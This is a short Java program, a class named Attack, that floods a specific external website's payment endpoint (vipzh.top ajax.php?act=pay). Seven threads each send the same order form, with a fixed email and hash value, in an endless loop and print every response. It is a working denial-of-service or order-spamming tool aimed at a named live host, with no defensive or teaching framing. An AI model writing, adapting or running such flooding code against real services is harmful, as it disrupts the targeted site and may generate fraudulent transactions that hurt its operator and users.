package com.xubing;

import org.apache.http.Consts;
import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class Attack {


    public static void main(String[] args) throws Exception {

        HttpPost post = new HttpPost("http://vipzh.top/ajax.php?act=pay");
        List<NameValuePair> formparams = new ArrayList<NameValuePair>();
        formparams.add(new BasicNameValuePair("tid", "1"));
        formparams.add(new BasicNameValuePair("inputvalue", "xbb@123.com"));
        formparams.add(new BasicNameValuePair("num", "1"));
        formparams.add(new BasicNameValuePair("hashsalt", "130f7b8822ef7852a420ec5acc6c1c85"));
        UrlEncodedFormEntity entity = new UrlEncodedFormEntity(formparams, Consts.UTF_8);
        post.setEntity(entity);

        ExecutorService pool = Executors.newFixedThreadPool(7);

        for (int i = 0; i < 7; i++) {
            pool.submit(() -> {
                CloseableHttpClient httpclient = HttpClients.createDefault();
                int j = 0;
                while (true) {
                    CloseableHttpResponse response = httpclient.execute(post);
                    try {
                        HttpEntity responseEntity = response.getEntity();
                        System.out.println(EntityUtils.toString(responseEntity));
                        System.out.println(++j);
                    } finally {
                        response.close();
                    }
                }
            });
        }
    }
}
